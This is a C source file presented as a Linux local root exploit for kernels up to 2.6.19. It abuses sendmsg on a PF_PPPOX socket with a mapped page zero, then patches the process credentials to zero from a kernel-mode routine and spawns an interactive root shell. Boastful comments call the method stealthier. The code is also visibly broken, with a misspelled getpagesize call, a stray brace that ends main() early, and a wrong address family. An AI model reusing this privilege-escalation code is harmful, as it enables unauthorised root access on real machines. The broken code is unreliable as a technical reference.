// MY sendmsg() WITHOUT crashing,imagesize(),and 2in1 exploits! PF_PPPOX/udpsendmsg() in 1 -wither one will spawn sh! (xd)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/mman.h>

#define PAGE_SIZE getpagezize()
#define PF_PPPOX AF_PPPOX
#define AF_PPPOX 24

unsigned int uid, gid;
void kernel_code() {
unsigned long where=0;
unsigned long *pcb_task_struct;
where=(unsigned long )&where;
where&=~8191;
pcb_task_struct=(unsigned long *)where;
while(pcb_task_struct) {
if(pcb_task_struct[0]==uid&&pcb_task_struct[1]==uid&& pcb_task_struct[2]==uid&&pcb_task_struct[3]==uid&&
pcb_task_struct[4]==gid&&pcb_task_struct[5]==gid&& pcb_task_struct[6]==gid&&pcb_task_struct[7]==gid) {
pcb_task_struct[0]=pcb_task_struct[1]=pcb_task_struct[2]=pcb_task_struct[3]=0;
pcb_task_struct[4]=pcb_task_struct[5]=pcb_task_struct[6]=pcb_task_struct[7]=0;
break;
}
pcb_task_struct++;
}
return;
}

int main(int argc, char **argv) {
int s;
struct msghdr header;
struct sockaddr_in sin;
char *rtable = NULL;
fprintf(stderr,"Sendmsg - Linux Localroot <= 2.6.19 - xd vers using better method (ring3->ring0)\n");
s = socket(PF_PPPOX,SOCK_DGRAM, 24);
if (s == -1) {
fprintf(stderr, "[-] No socket\n");
return -1;
}
memset(&header, 0, sizeof(struct msghdr));
memset(&sin, 0, sizeof(struct sockaddr_in));
sin.sin_family = IPPROTO_UDP;
sin.sin_addr.s_addr = inet_addr("127.0.0.1");
sin.sin_port = INADDR_ANY;
header.msg_name = &sin;
header.msg_namelen = sizeof(sin);
rtable = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0); // made this better (xd)
}
*(unsigned long *)(rtable + 0x74) = (unsigned long)&kernel_code; // testing an enhanced method rather than a mapped, unuseable page (xd)
sendmsg(s, &header, 0);
sendmsg(s, &header, MSG_MORE|MSG_PROXY);  // using sendmsg() rather than sento() , more stealth now.. (xd)
setuid(0);
execl("/bin/sh","/bin/sh","-i" ,NULL);
close(s);
return 0;
}